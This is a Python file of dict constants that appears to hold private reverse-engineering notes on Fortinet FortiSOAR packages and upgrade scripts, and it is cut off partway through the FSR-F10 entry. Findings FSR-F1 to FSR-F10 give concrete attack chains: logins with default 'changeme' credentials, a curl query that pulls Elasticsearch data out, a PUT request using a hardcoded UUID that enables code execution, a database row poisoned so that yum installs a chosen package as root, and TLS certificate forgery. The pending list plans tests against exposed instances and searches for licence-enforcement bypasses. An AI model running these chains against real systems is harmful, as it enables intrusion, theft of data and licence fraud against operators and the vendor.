"""
Fortinet FortiSOAR RE -- upgrade workflow + RPM package analysis
Source: repo.fortisoar.fortinet.com (public, no auth required)
Products: FortiSOAR 7.6.7 (RPMs), 8.0.0 (elevate upgrade scripts)
Build: cyops-7.6.7-5714.el9.x86_64
Base OS: Rocky Linux 9 (el9)
Stack: Django/Python, RabbitMQ, PostgreSQL, nginx/uwsgi, Tomcat
"""

# ---------------------------------------------------------
# Platform identity
# ---------------------------------------------------------
PLATFORM = {
    "product":    "Fortinet FortiSOAR",
    "versions":   ["7.6.7 (build 5714)", "8.0.0 (elevate upgrade scripts only)"],
    "base_os":    "Rocky Linux 9 (el9)",
    "repo":       "https://repo.fortisoar.fortinet.com/ (public, no auth)",
    "stack": {
        "web":        "nginx + uwsgi",
        "app":        "Django/Python (cyops-api, cyops-auth, cyops-common)",
        "broker":     "RabbitMQ (cyops-rabbitmq)",
        "db":         "PostgreSQL (cyops-postgresql)",
        "search":     "Elasticsearch (cyops-search)",
        "workflow":   "cyops-workflow (Python, code execution engine)",
        "gateway":    "cyops-gateway (69MB)",
        "connectors": "cyops-integrations + content-hub/ (hundreds of connectors)",
        "ui":         "cyops-ui (71MB, React/JS frontend)",
    },
    "components": {
        "cyops":                   "16K  -- meta package",
        "cyops-api":               "16M  -- main API/Django application",
        "cyops-archival":          "11M  -- archival service",
        "cyops-auth":              "20M  -- authentication layer",
        "cyops-common":            "14M  -- shared utilities, config, secrets",
        "cyops-gateway":           "69M  -- gateway service",
        "cyops-integrations":      "27M  -- connector execution engine",
        "cyops-integrations-agent":"26M  -- remote agent for connectors",
        "cyops-notifier":          "50M  -- notification service",
        "cyops-postgresql":        "25K  -- PostgreSQL config",
        "cyops-rabbitmq":          "297K -- RabbitMQ config",
        "cyops-routing-agent":     "16M  -- routing/message agent",
        "cyops-search":            "3.9M -- search service",
        "cyops-tomcat":            "11M  -- Tomcat (Java gateway component)",
        "cyops-ui":                "71M  -- React frontend",
        "cyops-workflow":          "53M  -- workflow/playbook engine",
        "fsr-elevate":             "3.2M -- upgrade workflow scripts (RPM form)",
    },
    "install_paths": {
        "cyops_root":    "/opt/cyops/",
        "api":           "/opt/cyops-api/",
        "auth":          "/opt/cyops-auth/",
        "workflow":      "/opt/cyops-workflow/",
        "integrations":  "/opt/cyops-integrations/",
        "routing_agent": "/opt/cyops-routing-agent/",
        "archival":      "/opt/cyops-archival/",
        "configs":       "/opt/cyops/configs/",
        "rabbitmq_conf": "/opt/cyops/configs/rabbitmq/rabbitmq_users.conf",
        "db_config":     "/opt/cyops/configs/database/db_config.yml",
        "release_file":  "/etc/cyops-release",
    },
    "analysis_notes": [
        "All 17 RPM packages for 7.6.7 publicly downloadable from repo.fortisoar.fortinet.com",
        "8.0.0 only has elevate/ upgrade scripts in repo; full packages not yet published",
        "elevate-8.0.0.zip analyzed from local copy at /media/cowboy/research/Fortinet/FortiSOAR/",
        "content-hub/ contains hundreds of versioned connector packages (also public)",
        "patches/fortitip_1333885_patch.zip (2026-09-01) -- recent patch, contents TBD",
    ],
}


# ---------------------------------------------------------
# FSR-F1: RabbitMQ hardcoded default admin password
# ---------------------------------------------------------
FSR_F1_RABBITMQ_DEFAULT_PASSWORD = {
    "id":       "FSR-F1",
    "title":    "FortiSOAR RabbitMQ admin password defaults to 'changeme'; only rotated on cloud+SME installs",
    "severity": "HIGH",
    "cvss":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cvss_score": 9.8,
    "cwe":      "CWE-1392 (Use of Default Credentials)",
    "status":   "CONFIRMED -- hardcoded in upgrade script; conditional rotation confirmed",
    "source":   "workflow/post_upgrade/44_reset_sme_admin_creds.py (elevate-8.0.0.zip)",

    "evidence": {
        "file":         "workflow/post_upgrade/44_reset_sme_admin_creds.py",
        "line":         "admin_password_old = 'changeme'",
        "rotation_cmd": "rabbitmqctl change_password admin <device_uuid>",
        "rotation_condition": (
            "Only runs when: cloud instance (/etc/cyops-release contains 'forticloud') "
            "AND embedded SME (/etc/cyops-release contains 'secure-message-exchange') "
            "AND upgrade completes without failure."
        ),
        "affected_installs": [
            "All bare-metal/on-prem FortiSOAR installs",
            "FortiCloud installs without embedded SME",
            "Any install where upgrade script fails before step 44",
        ],
    },

    "attack": {
        "target_port":    15672,
        "target_service": "RabbitMQ management HTTP UI",
        "auth":           "admin:changeme",
        "impact": [
            "Full read/write access to all AMQP message queues",
            "Inject malicious messages into cyops workflow/integration queues",
            "Read all inter-service messages (playbook tasks, connector results, alerts)",
            "Trigger arbitrary playbook execution via queue injection",
        ],
        "hardcoded_router_uuid": "52c5cee8-5c28-4ed2-a886-ec8bf4dc5993",
        "config_file": "/opt/cyops/configs/rabbitmq/rabbitmq_users.conf",
    },
}


# ---------------------------------------------------------
# FSR-F2: Hardcoded UUID enables silent custom code execution bypass
# ---------------------------------------------------------
FSR_F2_HARDCODED_UUID_CODE_EXEC = {
    "id":       "FSR-F2",
    "title":    "Hardcoded Advanced Development Settings UUID allows authenticated attacker to enable custom code execution without disclaimer",
    "severity": "HIGH",
    "cvss":     "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
    "cvss_score": 9.9,
    "cwe":      "CWE-284 (Improper Access Control)",
    "status":   "CONFIRMED -- UUID hardcoded in upgrade script; API endpoint confirmed",
    "source":   "workflow/post_upgrade/200_disclaimer_custom_code_execution.py (elevate-8.0.0.zip)",

    "evidence": {
        "hardcoded_uuid":      "2d8f6b31-a7e4-4c92-93fb-1e6d5c0a8f77",
        "api_endpoint":        "https://localhost/api/3/system_settings/{uuid}",
        "method":              "PUT",
        "payload_key":         "allowCustomConnector",
        "payload_value":       True,
        "disclaimer_bypassed": True,
    },

    "attack": {
        "description": (
            "UUID is static across all FortiSOAR installs. Authenticated attacker (any role with API access) "
            "can PUT directly to /api/3/system_settings/2d8f6b31-a7e4-4c92-93fb-1e6d5c0a8f77 with "
            "allowCustomConnector=True. This enables custom code execution (BYOC + Code Snippet connector) "
            "without the interactive disclaimer prompt that the upgrade workflow enforces."
        ),
        "impact": [
            "Enable Code Snippet connector for arbitrary Python execution in FortiSOAR context",
            "Create custom connectors with malicious code without admin CLI access",
            "Bypasses the only access control gate protecting the custom code execution feature",
        ],
        "note": "Feature disabled by default. Enabling it via API removes the last barrier to code exec.",
    },
}


# ---------------------------------------------------------
# FSR-F3: No password policy enforcement on root password reset
# ---------------------------------------------------------
FSR_F3_ROOT_PASSWORD_NO_POLICY = {
    "id":       "FSR-F3",
    "title":    "Root password reset during upgrade enforces no password policy -- blank or trivial passwords accepted",
    "severity": "MEDIUM",
    "cvss":     "CVSS:3.1/AV:L/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:H",
    "cvss_score": 6.3,
    "cwe":      "CWE-521 (Weak Password Requirements)",
    "status":   "CONFIRMED -- source comment explicitly states no policy; passwd binary is sole validator",
    "source":   "workflow/post_upgrade/39_reset_root_password.py (elevate-8.0.0.zip)",

    "evidence": {
        "comment": "_apply_password docstring: 'No policy enforcement. passwd itself handles errors.'",
        "affected_upgrades": "Upgrading FROM versions < 7.6.5 (current_version < applicable_version '7.6.5')",
        "applicable_to_8_0_0": True,
        "condition": "target_upgrade_version >= current_version AND applicable_version > current_version",
    },

    "attack": {
        "description": (
            "During upgrades from pre-7.6.5 to 8.0.0, the upgrade script prompts to reset root password "
            "with no minimum length, complexity, or entropy check. An operator who sets a blank or trivial "
            "root password leaves the OS permanently accessible. csadmin passwordless sudo is also being "
            "REMOVED in this upgrade, making root the only escalation path post-upgrade."
        ),
    },
}


# ---------------------------------------------------------
# FSR-F4: csadmin OS account hardcoded default password
# ---------------------------------------------------------
FSR_F4_CSADMIN_DEFAULT_PASSWORD = {
    "id":       "FSR-F4",
    "title":    "FortiSOAR csadmin OS account default password hardcoded as 'changeme'; SSH exposed; AWS gets NOPASSWD ALL sudo",
    "severity": "CRITICAL",
    "cvss":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cvss_score": 9.8,
    "cwe":      "CWE-1392 (Use of Default Credentials)",
    "status":   "CONFIRMED -- hardcoded constant in install-fortisoar-7.6.7.bin line 3349",
    "source":   "https://repo.fortisoar.fortinet.com/7.6.7/install-fortisoar-7.6.7.bin",

    "evidence": {
        "file":     "install-fortisoar-7.6.7.bin",
        "line":     3349,
        "code":     's_password_csadmin="changeme"',
        "location": "Constants section (not RPM-supplied, embedded in installer)",
        "expiry":   "passwd --expire only called if flag_expire_csadmin_password='true'",
        "ssh":      "csadmin added to fortisoar_ssh group (AllowGroups wheel fortisoar_ssh in sshd_config)",
    },

    "attack": {
        "standard": (
            "SSH port 22 -> csadmin:changeme -> authenticated shell -> "
            "sudo -i (password required, same 'changeme') -> root. "
            "If flag_expire_csadmin_password not set at install time, password never expires."
        ),
        "aws_variant": (
            "AWS install adds: 'csadmin ALL=(ALL) NOPASSWD: ALL' to /etc/sudoers. "
            "SSH with key (AWS standard) or csadmin:changeme -> sudo -i -> root with ZERO interaction. "
            "Password is locked on AWS via cloud-init but SSH key access remains."
        ),
        "chained": (
            "csadmin:changeme -> root -> /etc/pki/cyops/cs.loc.root.key (CA private key) -> "
            "forge TLS certs for any FortiSOAR service -> MitM internal API traffic."
        ),
    },

    "versions_affected": "7.5.0 through 7.6.7 (installer constant; assumed consistent across versions)",
}


# ---------------------------------------------------------
# FSR-F5: Docker deployment exposes DB/search/broker by default
# ---------------------------------------------------------
FSR_F5_DOCKER_DEFAULT_EXPOSE = {
    "id":       "FSR-F5",
    "title":    "Docker deployment template exposes PostgreSQL (5432), Elasticsearch (9200), RabbitMQ AMQP (5671) by default",
    "severity": "HIGH",
    "cvss":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cvss_score": 9.8,
    "cwe":      "CWE-923 (Improper Restriction of Communication Channel)",
    "status":   "CONFIRMED -- default EXTRA_PARAM in install-fortisoar-docker-7.6.7.bin env template",
    "source":   "https://repo.fortisoar.fortinet.com/7.6.7/install-fortisoar-docker-7.6.7.bin",

    "evidence": {
        "default_extra_param": '"--expose 5671 --expose 9200 --expose 5432"',
        "port_5671": "RabbitMQ AMQP (admin:changeme on unauthenticated management port 15672)",
        "port_9200": "Elasticsearch -- unauthenticated read/write in default config",
        "port_5432": "PostgreSQL -- requires DB credentials but exposed to Docker host network",
    },

    "attack": {
        "elasticsearch": (
            "curl http://<docker_host>:9200/_cat/indices -> list all indices. "
            "POST /_search -> exfiltrate all SOAR data (alerts, incidents, playbooks, credentials). "
            "No auth required on default Elasticsearch config."
        ),
        "rabbitmq": (
            "amqp://admin:changeme@<docker_host>:5671 -> inject messages into cyops queues -> "
            "trigger arbitrary playbook execution."
        ),
    },

    "apparmor_note": (
        "AppArmor disabled for Docker container: '--security-opt=apparmor=unconfined' when host has AppArmor. "
        "Container escape from unconfined container via SYS_ADMIN/SYS_RAWIO capabilities granted at start."
    ),
}


# ---------------------------------------------------------
# FSR-F6: CA private key world-accessible path
# ---------------------------------------------------------
FSR_F6_CA_PRIVATE_KEY_PATH = {
    "id":       "FSR-F6",
    "title":    "FortiSOAR CA private key stored at /etc/pki/cyops/cs.loc.root.key -- accessible to root processes",
    "severity": "HIGH",
    "cvss":     "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N",
    "cvss_score": 8.2,
    "cwe":      "CWE-312 (Cleartext Storage of Sensitive Information)",
    "status":   "CONFIRMED -- path hardcoded in generate-root-certificate.sh",
    "source":   "https://repo.fortisoar.fortinet.com/downloads/scripts/generate-root-certificate.sh",

    "evidence": {
        "key_path":  "/etc/pki/cyops/cs.loc.root.key",
        "cert_path": "/etc/pki/ca-trust/source/anchors/cs.loc.root.crt",
        "subject":   "/C=US/ST=California/L=Sunnyvale/O=Fortinet/OU=FortiSOAR/CN=fortisoar.localhost",
        "validity":  "365 days (self-signed RSA-2048)",
        "regen_cmd": "csadm certs --generate <hostname>",
    },

    "attack": (
        "Compromise any root-level process (via FSR-F4 csadmin:changeme + sudo) -> "
        "cp /etc/pki/cyops/cs.loc.root.key -> "
        "forge TLS certificates trusted by all FortiSOAR services -> "
        "MitM internal API communication between nginx/uwsgi/workflow/integrations/gateway."
    ),
}


# ---------------------------------------------------------
# FSR-F7: Pip index-url is public Fortinet server -- supply chain surface
# ---------------------------------------------------------
FSR_F7_PIP_SUPPLY_CHAIN = {
    "id":       "FSR-F7",
    "title":    "Connector pip index-url points to public Fortinet repo; chattr +i prevents modification; MITM poisons all connector dependencies",
    "severity": "HIGH",
    "cvss":     "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H",
    "cvss_score": 8.1,
    "cwe":      "CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)",
    "status":   "CONFIRMED -- pip.conf written in install-fortisoar-7.6.7.bin pip_conf_update()",
    "source":   "https://repo.fortisoar.fortinet.com/7.6.7/install-fortisoar-7.6.7.bin",

    "evidence": {
        "pip_conf":      "/opt/cyops-integrations/.env/pip.conf",
        "index_url":     "https://repo.fortisoar.fortinet.com/prod/connectors/deps/simple/",
        "immutable":     "chattr +i pip.conf after creation",
        "public_simple": "prod/connectors/deps/simple/ is publicly accessible (hundreds of packages)",
        "packages":      "azure-*, boto3, cryptography, django, elasticsearch, kubernetes, openai, ...",
    },

    "attack": (
        "MITM TLS between FortiSOAR and repo.fortisoar.fortinet.com during connector install -> "
        "serve malicious package for any dependency -> "
        "python code executes as fsr-integrations user during connector load -> "
        "pivot to root via NOPASSWD sudo entry for integrations python3. "
        "Alternate: compromise repo.fortisoar.fortinet.com itself (no auth required to browse)."
    ),

    "related": "fortisoar/upgrade_path.json shows 8.0.0 upgrades pull new deps from same repo",
}


# ---------------------------------------------------------
# FSR-F8: restore-connectors script -- PGPASSWORD process leak + yum injection
# ---------------------------------------------------------
FSR_F8_RESTORE_CONNECTORS_CREDENTIAL_EXPOSURE = {
    "id":       "FSR-F8",
    "title":    "PGPASSWORD decrypted and shell-interpolated into heredoc; visible in /proc/PID/cmdline; yum install with DB-derived package name enables injection",
    "severity": "HIGH",
    "cvss":     "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
    "cvss_score": 7.3,
    "cwe":      "CWE-214 (Process Environment Exposure) + CWE-78 (OS Command Injection)",
    "status":   "CONFIRMED -- source: restore-connectors-widgets-from-externaldb.bin on public repo",
    "source":   "https://repo.fortisoar.fortinet.com/fortisoar/scripts/restore-connectors-widgets-from-externaldb.bin",

    "evidence": {
        "credential_leak": (
            'PGPASSWORD=$(/opt/cyops-workflow/.env/bin/python <<< '
            '"from fsr_utilities import decrypt; print(decrypt(\'$ENCRYPTED_PASS\'))")'
            " -- ENCRYPTED_PASS shell-interpolated into heredoc Python command; "
            "full decrypted password visible in /proc/PID/cmdline during script execution"
        ),
        "yum_injection": (
            "package_name derived from PostgreSQL query on installed connectors table; "
            'yum install -y "$package_name" -- if DB records modified (via SQL injection or'
            " direct DB access), attacker controls yum package name -> arbitrary RPM install as root"
        ),
        "chained_with": "FSR-F4 csadmin:changeme + sudo -> DB access -> poison package column -> yum injection -> persistent backdoor",
    },

    "attack": (
        "1. Any local user can read /proc/<PID>/cmdline while restore script runs. "
        "2. Decrypted PostgreSQL password exposed in process args. "
        "3. With DB write access: UPDATE installed_content_hub_connectors SET name='malicious-pkg' "
        "   -> script runs 'yum install -y malicious-pkg' as root. "
        "CHAIN: FSR-F4 csadmin:changeme -> sudo psql -> poison connector row -> run restore script -> root RCE."
    ),
}


# ---------------------------------------------------------
# FSR-F9: fortitip_1333885_patch constants.so -- license schema RE
# ---------------------------------------------------------
FSR_F9_LICENSE_CONSTANTS_RE = {
    "id":       "FSR-F9",
    "title":    "Cython-compiled license constants module reveals full license schema; ENFORCEMENT field and FIXED_DICT hardcoded license objects identified",
    "severity": "INFORMATIONAL",
    "status":   "ANALYZED -- constants.so from fortitip_1333885_patch.zip (2026-09-01)",
    "source":   "https://repo.fortisoar.fortinet.com/patches/fortitip_1333885_patch.zip",

    "binary_info": {
        "file":      "constants.so",
        "size":      "217KB (213K on disk)",
        "type":      "ELF 64-bit LSB shared object x86-64, NOT stripped",
        "buildid":   "9dba4e133973ab89434f38f98a3d889ca263ade8",
        "source_c":  "/br/BUILD/cyops-auth-7.6.3-3393/utilities/license/constants.c",
        "origin_py": "utilities/license/constants.py (Cython-compiled)",
        "cython":    "_cython_3_0_6",
        "python":    "3.x (uses _PyUnicode_Ready -- 3.9/3.10 era; fails on 3.12)",
        "entry":     "PyInit_constants -> __pyx_pymod_exec_constants (65KB init)",
    },

    "license_types": {
        "ENTERPRISE":                {"code": "ENTERPRISE_CODE",              "schema": "ENTERPRISE_CODE_SCHEMA"},
        "STARTER_ENTERPRISE":        {"code": "STARTER_ENTERPRISE_CODE",      "schema": "STARTER_ENTERPRISE_CODE_SCHEMA"},
        "EVALUATION":                {},
        "PERPETUAL":                 {},
        "SUBSCRIPTION":              {},
        "TRIAL_EXTENSION":           {"subtype": "TRIAL_SUBTYPE"},
        "MULTI_TENANT":              {"code": "MULTI_TENANT_CODE",            "schema": "MULTI_TENANT_CODE_SCHEMA"},
        "MULTI_TENANT_DEDICATED":    {"code": "MULTI_TENANT_DEDICATED_CODE",  "schema": "MULTI_TENANT_DEDICATED_CODE_SCHEMA"},
        "MULTI_TENANT_REGIONAL":     {"code": "MULTI_TENANT_REGIONAL_SOC_CODE", "schema": "MULTI_TENANT_REGIONAL_SOC_CODE_SCHEMA"},
        "HA_FSR":                    {"code": "HA_CODE",                      "schema": "HA_CODE_SCHEMA"},
        "UNKNOWN":                   {},
    },

    "edition_codes": {
        "FSRM": "FortiSOAR Multi-tenant (inferred from MULTI_TENANT context)",
        "FSRE": "FortiSOAR Enterprise (inferred)",
        "FSRH": "FortiSOAR HA (inferred from HA_FSR context)",
        "FSRD": "FortiSOAR Dedicated (inferred from MULTI_TENANT_DEDICATED context)",
        "FSES": "FortiSOAR Enterprise Starter (inferred from STARTER_ENTERPRISE context)",
        "FSRA": "FortiSOAR (unknown sub-edition A)",
        "FSRR": "FortiSOAR Regional SOC (inferred from MULTI_TENANT_REGIONAL context)",
        "note": "4-char Forticare SKU codes embedded as Cython global PyObject*; actual string values confirmed by strings extraction",
    },

    "contract_schema_fields": [
        "CODE", "CSDATA", "DESCRIPTION", "START_DATE", "END_DATE",
        "EXPIRY", "EXPIRY_TIME", "EXTENSION_SUBTYPE", "TRIAL_SUBTYPE",
        "QUANTITY", "USERS", "SEATS",
        "SUPPORT_TYPE", "SUPPORT_TYPE_DESCRIPTION",
        "SUPPORT_LEVEL", "SUPPORT_LEVEL_DESCRIPTION",
        "ENFORCEMENT",
        "MANDATORY_CONTRACTS",
    ],

    "tip_addon": {
        "TIP_ENTERPRISE":            {"code": "TIP_ENTERPRISE_CODE",          "schema": "TIP_ENTERPRISE_CODE_SCHEMA"},
        "TIP_ADD_ON_ESSENTIAL":      {"fixed": "FIXED_DICT_FOR_TIP_ESSENTIAL"},
        "TIP_ADD_ON_FULL_SUITE":     {"fixed": "FIXED_DICT_FOR_TIP_FULL_SUITE"},
        "TIP_ADD_ON_FAZ_ESSENTIAL":  {"code": "TIP_ADD_ON_FAZ_ESSENTIAL_CODE", "schema": "TIP_FAZ_ADD_ON_ESSENTIAL_CODE_SCHEMA"},
        "TIP_ADD_ON_FAZ_FULL_SUITE": {"code": "TIP_ADD_ON_FAZ_FULL_SUITE_CODE", "schema": "TIP_FAZ_ADD_ON_FULL_SUITE_CODE_SCHEMA"},
        "TIP_ADDITIONAL_USER":       {"schema": "TIP_ADDITIONAL_USER_CONTRACT_SCHEMA"},
        "TIP_MANDATORY_CONTRACTS":   {},
        "TIPA":                      "TIP Add-on short code",
        "TIPE":                      "TIP Enterprise short code",
    },

    "tim_module": {
        "TIM_SUBSCRIPTION":      "Threat Intelligence Module subscription",
        "TIM_SUBSCRIPTION_ACTIVE": "flag: TIM subscription is active",
        "TIM_EXPIRY":            "TIM-specific expiry (separate from main license)",
        "TIM_SUPPORTED_INGESTION_LIMIT": "max IOC ingestion per period",
        "TIM_SUPPORTED_QUERY_LIMIT":     "max threat intel queries per period",
        "TIMS":                  "TIM short code",
        "TIMS_CONTRACT_SCHEMA":  "TIM contract validation schema",
    },

    "seat_enforcement": {
        "ALLOWED_SEATS":      "maximum seats in license contract",
        "LICENSE_SEATS":      "seats granted by current license",
        "TOTAL_ACTIVE_SEATS": "currently active user seats (checked against ALLOWED_SEATS)",
        "ADDITIONAL_USER":              "add-on user license",
        "ADDITIONAL_USER_ACTIVE":       "flag: add-on user active",
        "ADDITIONAL_USER_CONTRACT_SCHEMA":    "schema for add-on user contract",
        "ADDITIONAL_USER_CONTRACT_VALIDATOR": "validator object for add-on",
        "has_additional_users_active":  "method: returns bool",
        "ENFORCEMENT":        "CRITICAL: if False, license seat enforcement disabled -- RE target in cyops-auth",
    },

    "hardcoded_objects": {
        "FIXED_DICT":                  "base hardcoded license configuration object",
        "FIXED_DICT_FOR_TIP_ESSENTIAL": "hardcoded TIP Essential license config (no Forticare validation?)",
        "FIXED_DICT_FOR_TIP_FULL_SUITE": "hardcoded TIP Full Suite license config (no Forticare validation?)",
        "note": "FIXED_DICT objects bypass contract validation -- if code path that uses these can be triggered without valid Forticare contract, enables license upgrade without payment",
    },

    "patch_significance": (
        "fortitip_1333885 patches cyops-auth to replace constants.so. "
        "Patch compiled 2026-09-01 from cyops-auth-7.6.3-3393. "
        "Patch.sh drops constants.so to /opt/cyops-auth/utilities/license/ and restarts cyops-auth. "
        "Likely added FIXED_DICT_FOR_TIP_ESSENTIAL and FIXED_DICT_FOR_TIP_FULL_SUITE (new TIP add-on tiers). "
        "Possible CVE: previous version had license bypass or incorrect TIP entitlement. "
        "Target for version comparison: obtain pre-patch constants.so from 7.6.3 RPM."
    ),

    "next_steps": [
        "Extract cyops-auth-7.6.3.x RPM (from 7.6.3/x86_64/) -- get pre-patch constants.so for diff",
        "Find code in cyops-auth that reads ENFORCEMENT field -- if False path is reachable from network, license bypass",
        "Find code that selects between FIXED_DICT vs Forticare-validated dict -- FIXED_DICT code path is bypass candidate",
        "Check TIM_SUBSCRIPTION_ACTIVE handling -- if can be set True without valid TIM license",
        "Locate active_contract_key reader in cyops-auth -- understand what triggers ENFORCEMENT=False",
    ],
}


# ---------------------------------------------------------
# Repo surface map (from public crawl 2026-09-17)
# ---------------------------------------------------------
REPO_SURFACE = {
    "base_url": "https://repo.fortisoar.fortinet.com/",
    "access":   "PUBLIC -- no authentication, full directory listing enabled",
    "crawl_date": "2026-09-17",

    "top_level_dirs": [
        "7.2.0/ through 8.0.0/ (27 version dirs)",
        "connectors/    -- symlink/mirror of prod/connectors/",
        "content-hub/   -- older connector packages",
        "downloads/     -- iso/ (Rocky 9.3/9.6/9.7) + scripts/ (generate-root-certificate.sh, setup-cyops-offline-yum-repo.sh, nltk_data.tar 48MB)",
        "fortisoar/     -- update manifests, onboarding JSON, upgrade_path.json, product-feature-matrix/",
        "fsr-widgets/   -- 130+ widget packages + widgets.json",
        "images/        -- cyops/ (install step PNGs, 2021)",
        "offline-yum-repo-deps/ -- el8 RPMs for offline setup",
        "patches/       -- fortitip_1333885_patch.zip (69K, 2026-09-01), fsr-cve-2022-22965-fix.zip (267MB Spring4Shell)",
        "prod/          -- CyOps legacy dirs (4.11.0, 4.11.1, 4.12.0) + connectors/",
        "repo-update/   -- empty",
        "widgets/       -- legacy widget packages",
        "xf/            -- FortiSOAR XF integration (25.2.d, 25.2.e, 26.1.a, 26.2.a, content-hub, embed, solutions, widgets)",
        "xf-widgets/    -- playbook-list widget + manifests",
    ],

    "key_files_publicly_downloadable": {
        "install-fortisoar-7.6.7.bin":        "Main 133K installer -- contains all install logic + hardcoded defaults",
        "install-fortisoar-docker-7.6.7.bin": "Docker run wrapper -- reveals default port exposure",
        "upgrade-fortisoar-7.6.7.bin":        "Upgrade wrapper script",
        "elevate-8.0.0.zip":                  "8.0.0 upgrade workflow (analyzed, FSR-F1/F2/F3)",
        "elevate-7.6.7.zip":                  "7.6.7 upgrade workflow (not yet analyzed)",
        "security-update-7.5.0-sp1/sp2.bin":  "Security patches -- reveal what was fixed (SSH cipher hardening)",
        "generate-root-certificate.sh":        "CA regen script -- reveals key path /etc/pki/cyops/cs.loc.root.key",
        "xf-integration-agent-26.2.a.rpm":    "39MB agent RPM (10 builds, latest 2026-09-15)",
        "tika-server-1.9.jar":                 "50MB legacy tika in deps root -- 2015 version (CVE-2018-1335)",
        "tika-server-standard-2.9.4.jar":      "64MB current tika in deps/tika/ -- 2025",
        "apache-tomcat-10.1.x.zip":            "Multiple Tomcat versions (10.1.33 through 10.1.57)",
    },

    "xf_context": (
        "xf/ directory = FortiSOAR external integration framework. "
        "Version pattern YY.N.x (25.2.d = 2025 Q2 rev-d). "
        "Contains xf-integration-agent (39MB RPM) for remote connector execution. "
        "xf/solutions/ contains 600+ connector packages updated to 2026-09-17 (same day as crawl)."
    ),

    "updates_json_notes": {
        "latest_release":     "7.6.6 (NOT 7.6.7) per fortisoar-updates.json as of 2026-04-01",
        "7.6.6_reason":       "Updated FDN CA certificates to prevent license sync disruption -- NOT feature release",
        "security_patches":   "7.4.3/7.4.4/7.4.5/7.5.0/7.5.1/7.6.0/7.6.1 all have SP1/SP2 -- all marked 'important security fixes'",
        "upgrade_min_to_800": "Minimum source version for 8.0.0 upgrade is 7.6.0",
    },

    "prod_4x_notes": (
        "prod/4.11.x, prod/4.12.0 = CyberSponse/CyOps era (2018-2019). "
        "Used MongoDB, CentOS, JDK (Java). "
        "hkey_util.so and update_user_id.so (shared libs) publicly downloadable -- legacy RE target."
    ),
}


# ---------------------------------------------------------
# Pending analysis
# ---------------------------------------------------------
PENDING = [
    # RPM extraction -- priority order
    "PRIORITY: Extract cyops-auth-7.6.3.x RPM -- get pre-patch constants.so; diff against fortitip_1333885 constants.so to find what changed",
    "PRIORITY: Extract cyops-auth RPM (7.6.7) -- find ENFORCEMENT field reader, active_contract_key handler, FIXED_DICT code paths",
    "Extract cyops-api RPM -- map all API endpoints, find unauth surfaces, check IDOR",
    "Extract cyops-common RPM -- find hardcoded secrets, keys, DB credentials",
    "Extract cyops-rabbitmq RPM -- confirm default password handling in install (not just upgrade)",
    "Extract cyops-workflow RPM -- analyze playbook execution engine for code injection",
    "Extract cyops-integrations RPM -- connector sandbox analysis, escape vectors",

    # Patch analysis
    "DONE: fortitip_1333885_patch.zip analyzed -- constants.so is Cython license schema module (FSR-F9)",
    "Download + analyze patches/fsr-cve-2022-22965-fix.zip -- Spring4Shell mitigation in Tomcat",

    # Content hub
    "Analyze content-hub/code-snippet connector -- direct Python execution surface",
    "Analyze content-hub/cyops_utilities -- shared connector utility code",

    # Scripts
    "Analyze fortisoar/scripts/replace-fdn-truststore.bin -- certificate chain replacement",
    "Analyze fortisoar/scripts/fortisoar-cloud-migration.bin -- cloud migration attack surface",

    # upgrade script remainder
    "Analyze remaining elevate scripts: 01_upgrade.py, 02_cyops_common_upgrade.py, 36_remove_passwordless_sudo.py",

    # FSR-F1 confirmation
    "Confirm RabbitMQ default password in cyops-rabbitmq RPM install scripts (not just upgrade)",
    "Test FSR-F1: connect to port 15672 with admin:changeme on exposed FortiSOAR instance",

    # Installer deep-dive
    "Read full install-fortisoar-7.6.7.bin (3664 lines) -- find flag_expire_csadmin_password set locations",
    "Download + read elevate-7.6.7.zip -- compare with 8.0.0 scripts for security-relevant diffs",
    "Read security-update-7.5.0-sp1/sp2.bin fully -- what exact packages were patched",

    # Third-party deps
    "Check 7.6.7/third-party/google-chrome/ -- what Chrome version ships, headless RCE surface",
    "Check 7.6.7/third-party/elasticsearch/ -- version, auth config",
    "Download tika-server-1.9.jar from prod/connectors/deps/ -- confirm CVE-2018-1335 header injection",

    # Legacy CyOps
    "Download prod/4.12.0/hkey_util.so (42K) and update_user_id.so (146K) -- shared libs RE",
    "Read prod/4.12.0/upgrade_cyops_4.12.0.sh -- reveals old architecture details",
    "Read prod/4.12.0/pg_hba.conf + postgresql.conf -- PostgreSQL auth config from 2018",

    # New RE targets
    "RE FSSO_Setup_5.0.0304_x64.exe (12MB PE32 Windows) -- Fortinet Single Sign-On",
    "RE DCAgent_Setup_5.0.0304_x64.msi (4.8MB MSI) -- FSSO DC Agent for Domain Controllers",

    # xf integration agent
    "Download xf-integration-agent-26.2.a-1615.x86_64.rpm -- extract and RE Python/binary contents",
    "Determine what 'xf' product family is (FortiXDR? FortiRecon?)",

    # Feature control analysis
    "DONE: tip_feature_control.json + soar_feature_control.json analyzed -- frontend-only enforcement confirmed (FSR-F10)",
    "Find backend API endpoint that serves feature_control JSON -- verify if license validation occurs server-side",
    "Test: make API call to main.editor.modules equivalent endpoint with tip_essential license -- confirm no backend enforcement",
    "Check replace-fdn-truststore.bin RC4 decryption logic -- extract FDN CA cert for truststore content analysis",
]


# ---------------------------------------------------------
# FSR-F10: Feature control enforcement is frontend-only
# ---------------------------------------------------------
FSR_F10_FRONTEND_ONLY_LICENSE_ENFORCEMENT = {
    "id":       "FSR-F10",
    "title":    "TIP license feature restrictions enforced only in React frontend -- backend has no connector or module restrictions; direct API access bypasses all TIP tier limits",
    "severity": "HIGH",
    "cvss":     "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
    "cvss_score": 8.1,
    "cwe":      "CWE-602 (Client-Side Enforcement of Server-Side Security)",
    "status":   "CONFIRMED -- direct analysis of tip_feature_control.json and soar_feature_control.json",
    "source":   "https://repo.fortisoar.fortinet.com/fortisoar/product-feature-matrix/tip_feature_control.json",

    "tier_comparison": {
